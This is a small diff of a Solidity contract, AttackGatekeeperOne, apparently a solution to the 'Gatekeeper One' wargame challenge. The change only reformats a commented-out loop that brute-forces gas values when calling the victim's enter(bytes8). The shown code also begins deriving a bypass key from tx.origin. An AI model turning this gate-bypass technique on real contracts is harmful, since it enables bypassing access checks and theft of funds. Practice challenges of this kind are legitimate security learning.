@@ -13,14 +13,16 @@ contract AttackGatekeeperOne {
     }
     
     function attack() public {
-        /* for (uint i = 0; i < 8191; i++) {
+        /*for (uint i = 0; i < 8191; i++) {
             (bool success, ) = _victimAddress.call{gas: 82910 + i}(
                 abi.encodeWithSignature("enter(bytes8)", _key)
             );
             if (success) {
                 break;
             }
-        } */
+        }*/
+
+
        bytes2 last2Bytes = bytes2(uint16(uint160(tx.origin)));
        uint64 lastBits_uint = uint64(uint16(last2Bytes));
        uint64 highBits_uint = uint64(1) << 32;
